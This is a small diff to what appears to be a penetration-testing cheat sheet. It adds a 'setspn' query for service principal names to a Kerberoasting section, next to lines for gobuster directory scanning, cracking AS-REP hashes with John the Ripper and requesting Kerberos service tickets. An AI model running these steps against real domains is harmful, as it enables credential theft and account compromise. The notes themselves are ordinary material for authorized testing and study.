@@ -301,6 +301,7 @@ gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
             .\johnTheRipper\john-1.9.0-jumbo-1-win64\run\john.exe .\johnhash.txt --format=krb5asrep -wordlist=.\10k-worst-pass.txtc
         #### 12.2.2 Kerberoasting
             Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+            setspn -T research -Q */*
 
             Add-Type -AssemblyName System.IdentityModel
             New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “serviceprincipalname”
